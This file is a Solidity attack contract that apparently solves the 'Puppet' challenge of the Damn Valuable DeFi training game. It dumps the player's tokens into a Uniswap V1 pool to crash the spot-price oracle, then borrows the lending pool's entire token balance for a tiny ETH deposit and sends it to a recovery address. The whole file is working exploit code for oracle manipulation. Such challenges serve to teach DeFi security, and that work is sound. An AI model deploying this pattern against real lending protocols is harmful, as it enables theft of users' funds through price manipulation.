// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {PuppetPool} from "./PuppetPool.sol";

contract AttackerContract {
    address public player;
    address public lendingPool;
    address public uniswapExchange;
    address public token;

    constructor(address _player, address _lendingPool, address _token, address _uniswapExchange) {
        player = _player;
        lendingPool = _lendingPool;
        uniswapExchange = _uniswapExchange;
        token = _token;
    }

    function attack(address recovery) external payable {
        // transfer all tokens from player to this contract
        DamnValuableToken DVToken = DamnValuableToken(token);
        DVToken.transferFrom(player, address(this), DVToken.balanceOf(player));
        // approve the uniswapV1Exchange to transfer tokens on behalf of this contract
        IUniswapV1Exchange uniswapV1Exchange = IUniswapV1Exchange(uniswapExchange);
        DVToken.approve(uniswapExchange, DVToken.balanceOf(address(this)));

        // swap all tokens for ETH in Uniswap
        uniswapV1Exchange.tokenToEthSwapInput(
            DVToken.balanceOf(address(this)), // tokens sold
            1, // min ETH to receive
            block.timestamp * 5 // deadline
        );

        // calculate the amount of ETH needed to be deposited in the lending pool
        uint256 ethToDeposit = PuppetPool(lendingPool).calculateDepositRequired(DVToken.balanceOf(lendingPool));
        // call borrow function in the lending pool
        PuppetPool(lendingPool).borrow{value: ethToDeposit}(
            DVToken.balanceOf(lendingPool), // amount to borrow
            recovery // ecovery address
        );

    }

    receive() external payable {
        // This contract can receive ETH
    }
}